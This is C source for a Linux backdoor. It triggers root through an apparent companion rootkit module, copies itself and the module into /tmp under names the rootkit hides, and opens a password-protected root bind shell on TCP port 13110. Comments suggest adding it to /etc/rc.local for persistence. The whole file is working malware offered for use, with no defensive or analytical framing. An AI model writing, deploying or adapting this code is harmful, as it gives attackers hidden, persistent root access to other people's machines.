/*
* A backdoor which provide you a shell with root privileges 
* and move itself with lkm into target directory to hide better.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <fcntl.h>

// listening port
#define LPORT 13110
#define PASSWD "13110"

// used for rootkit to hide these file, but files which have these string as prefix will also be hide
#define BD_NAME "111nuxXX02"
#define LKM_NAME "111nuxXX01"

#define DST_BD "/tmp/"BD_NAME
#define DST_LKM "/tmp/"LKM_NAME

#define MAXLINE 4096
#define KEY_TO_ROOT "/proc/liinux"
#define INIT_D_FILE "/etc/rc.local"


void moveTo(char *src,char *dst){
    int sfd=open(src,O_RDONLY);
    if(sfd==-1)
        return;

    int dfd=open(dst,O_WRONLY|O_CREAT|O_TRUNC,0);
    if(dfd==-1)
        return;

    char buf[4096];
    int size=0;
    while((size=read(sfd,buf,4096))!=0){
        write(dfd,buf,size);
    }
    close(sfd);
    close(dfd);
}

int main(int argc, char **argv)
{
    int i, listenfd, connfd;        
    int fd;
    pid_t pid;
    char buf[MAXLINE];
    struct sockaddr_in s_addr;
    struct sockaddr_in c_addr;
    socklen_t c_size=sizeof(c_addr);

    // get root 
    fd = open(KEY_TO_ROOT, O_RDWR|O_CREAT, 0);
    close(fd);
    unlink(KEY_TO_ROOT);

    // test permisson
    // int r,e,s;
    // getresuid(&r, &e, &s);
    // printf("%d,%d,%d\n",r,e,s);
    
    // move itself and lkm into target directory 
    // you can also modify /etc/rc.local and /etc/modules.conf to make this backdoor and lkm get executed at boot time 
    moveTo("./"BD_NAME,DST_BD);
    unlink("./"BD_NAME);
    moveTo("./"LKM_NAME,DST_LKM);
    unlink("./"LKM_NAME);


    // make itself become daemen process
    // daemon(0,0);                    

    listenfd = socket(AF_INET,SOCK_STREAM,0);                 
    if (listenfd == -1){
        exit(1);
    }
    memset(&s_addr,0,sizeof(s_addr));
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
    s_addr.sin_port=htons(LPORT);

    if (bind(listenfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) == -1){
        exit(1);
    }
    if (listen(listenfd, 20)==-1){                            
        exit(1);
    }


    //ready to recieve
    while(1){
        connfd = accept(listenfd, (struct sockaddr *)&c_addr, &c_size);
        if((pid=fork())==0)
        {
            //child process create his child process
            if((pid = fork()) > 0)                         
            {
                //child process end 
                exit(0);                          
            }else if(!pid){    
                //deal with connection                   
                close(listenfd);                  
                char *some_str="passwd\n";
                write(connfd, some_str, strlen(some_str));
                memset(buf,0, MAXLINE);
                read(connfd, buf, MAXLINE);
                if (strncmp(buf,PASSWD,strlen(PASSWD)) !=0){
                    close(connfd);
                    exit(0);
                }else{
                    some_str="you come again\n";
                    write(connfd,some_str,strlen(some_str));
                    dup2(connfd,0);               
                    dup2(connfd,1);               
                    dup2(connfd,2);
                    execl("/bin/sh", NULL, (char *) 0);      
                }
            }
        }else if(pid>0){
            close(connfd);
            //wait for child process
            if (waitpid(pid, NULL, 0) != pid)                    
                exit(1);
        }else{
            exit(1);
        }
    }
}


